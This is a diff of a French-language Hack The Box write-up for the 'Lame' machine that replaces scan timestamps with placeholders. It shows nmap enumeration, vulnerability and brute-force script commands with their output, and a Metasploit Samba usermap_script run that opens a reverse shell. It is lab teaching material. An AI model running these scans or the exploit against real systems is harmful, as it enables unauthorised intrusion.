@@ -142,10 +142,9 @@ L’exploitation de cette faille via Metasploit donne immédiatement un **shell 
 
 Le scan initial TCP complet (`scans_nmap/full_tcp_scan.txt`) te révèle les ports ouverts suivants :
 
-> Note : les IP et timestamps peuvent varier selon les resets HTB ; l’important ici est la surface exposée.
 
 ```bash
-# Nmap 7.98 scan initiated Wed Feb  4 14:09:53 2026 as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/full_tcp_scan.txt lame.htb
+# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/full_tcp_scan.txt lame.htb
 Nmap scan report for lame.htb (10.129.x.x)
 Host is up (0.014s latency).
 Not shown: 65530 filtered tcp ports (no-response)
@@ -156,7 +155,7 @@ PORT     STATE SERVICE
 445/tcp  open  microsoft-ds
 3632/tcp open  distccd
 
-# Nmap done at Wed Feb  4 14:10:20 2026 -- 1 IP address (1 host up) scanned in 26.46 seconds
+# Nmap done at [date] -- 1 IP address (1 host up) scanned in 26.46 seconds
 ```
 
 ### Scan FTP/SMB (si services détectés)
@@ -170,7 +169,7 @@ Tu retrouves les résultats de cette énumération dans le fichier `scans_nmap/e
 Dans le cas de lame.htb, cette phase est effectivement exécutée, puisque le scan initial met en évidence la présence des services FTP (21) et SMB (139/445).
 
 ```bash
-# Nmap 7.98 scan initiated Wed Feb  4 14:10:20 2026 as: /usr/lib/nmap/nmap --privileged -Pn -sV -p21,139,445 --script=ftp-anon,ftp-syst,smb-os-discovery,smb-enum-shares,smb-enum-users --script-timeout=30s -T4 -oN scans_nmap/enum_ftp_smb_scan.txt lame.htb
+# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -sV -p21,139,445 --script=ftp-anon,ftp-syst,smb-os-discovery,smb-enum-shares,smb-enum-users --script-timeout=30s -T4 -oN scans_nmap/enum_ftp_smb_scan.txt lame.htb
 Nmap scan report for lame.htb (10.129.x.x)
 Host is up (0.97s latency).
 
@@ -297,7 +296,7 @@ Host script results:
 |_  System time: 2026-02-04T08:10:42-05:00
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Wed Feb  4 14:11:04 2026 -- 1 IP address (1 host up) scanned in 43.71 seconds
+# Nmap done at [date] -- 1 IP address (1 host up) scanned in 43.71 seconds
 ```
 
 
@@ -311,7 +310,7 @@ Résultat (`scans_nmap/aggressive_vuln_scan.txt`) :
 [+] Commande utilisée :
     nmap -Pn -A -sV -p"21,22,139,445,3632" --script="(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 "lame.htb"
 
-# Nmap 7.98 scan initiated Wed Feb  4 14:11:04 2026 as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p21,22,139,445,3632 "--script=(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 -oN scans_nmap/aggressive_vuln_scan_raw.txt lame.htb
+# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p21,22,139,445,3632 "--script=(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 -oN scans_nmap/aggressive_vuln_scan_raw.txt lame.htb
 Nmap scan report for lame.htb (10.129.x.x)
 Host is up (0.40s latency).
 
@@ -336,7 +335,7 @@ HOP RTT       ADDRESS
 2   946.50 ms lame.htb (10.129.x.x)
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Wed Feb  4 14:11:25 2026 -- 1 IP address (1 host up) scanned in 21.71 seconds
+# Nmap done at [date] -- 1 IP address (1 host up) scanned in 21.71 seconds
 
 ```
 
@@ -347,7 +346,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Vient ensuite le scan ciblé CMS (`scans_nmap/cms_vuln_scan.txt`).
 
 ```bash
-# Nmap 7.98 scan initiated Wed Feb  4 14:11:25 2026 as: /usr/lib/nmap/nmap --privileged -Pn -sV -p21,22,139,445,3632 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/cms_vuln_scan.txt lame.htb
+# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -sV -p21,22,139,445,3632 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/cms_vuln_scan.txt lame.htb
 Nmap scan report for lame.htb (10.129.x.x)
 Host is up (0.030s latency).
 
@@ -360,7 +359,7 @@ PORT     STATE SERVICE     VERSION
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Wed Feb  4 14:11:38 2026 -- 1 IP address (1 host up) scanned in 13.09 seconds
+# Nmap done at [date] -- 1 IP address (1 host up) scanned in 13.09 seconds
 
 ```
 
@@ -371,7 +370,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Le scan UDP rapide (`scans_nmap/udp_vuln_scan.txt`).
 
 ```bash
-# Nmap 7.98 scan initiated Wed Feb  4 14:11:39 2026 as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/udp_vuln_scan.txt lame.htb
+# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/udp_vuln_scan.txt lame.htb
 Nmap scan report for lame.htb (10.129.x.x)
 Host is up (0.57s latency).
 
@@ -397,7 +396,7 @@ PORT      STATE         SERVICE
 4500/udp  open|filtered nat-t-ike
 49152/udp open|filtered unknown
 
-# Nmap done at Wed Feb  4 14:11:46 2026 -- 1 IP address (1 host up) scanned in 7.32 seconds
+# Nmap done at [date] -- 1 IP address (1 host up) scanned in 7.32 seconds
 
 ```
 
@@ -791,7 +790,7 @@ View the full module info with the info, or info -d command.
 
 msf exploit(multi/samba/usermap_script) > run
 [*] Started reverse TCP handler on 10.10.x.x:4444 
-[*] Command shell session 1 opened (10.10.x.x:4444 -> 10.129.x.x:40485) at 2026-02-05 17:26:52 +0100
+[*] Command shell session 1 opened (10.10.x.x:4444 -> 10.129.x.x:40485) at [date] 17:26:52 +0100
 
 
 ```
